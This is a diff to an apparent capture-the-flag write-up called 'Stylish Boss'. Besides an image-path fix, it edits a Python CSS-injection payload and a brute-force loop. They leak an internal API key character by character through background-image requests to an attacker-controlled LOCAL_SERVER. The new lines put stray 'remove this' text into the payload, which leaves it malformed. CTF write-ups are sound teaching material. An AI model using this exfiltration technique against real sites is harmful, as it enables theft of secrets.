@@ -2,7 +2,7 @@
 categories:
   - CAT CTF
 image:
-  path: /assets/posts/Stylish Boss/preview.jpg
+  path: /assets/posts/Stylish-Boss/preview.jpg
 layout: post
 stags:
 title: Stylish Boss
@@ -55,7 +55,7 @@ plan is simple css injection charecter per charecter
 that's the payload that I found working 
 
 ```python
-payload = f"';#api-key-container[data-internal-api-key^=\"{candidate}\"]{{background-image: url(\"{LOCAL_SERVER}/{candidate}\")}};"
+payload = f"';#api-key-container[data-internal-api-key^=\"{candidate}\"] { remove this {background-image: url(\"{LOCAL_SERVER}/{candidate}\")}  remove this};"
 ```
 
 
@@ -129,7 +129,7 @@ def brute_force_key():
         found = False
         for c in charset:
             candidate = key + c
-            payload = f"';#api-key-container[data-internal-api-key^=\"{candidate}\"]{{background-image: url(\"{LOCAL_SERVER}/{candidate}\")}};"
+            payload = f"';#api-key-container[data-internal-api-key^=\"{candidate}\"]{ remove this {background-image: url(\"{LOCAL_SERVER}/{candidate}\")} remove this};"
 
             # Step 1: Set font with payload
             send_set_font(payload)
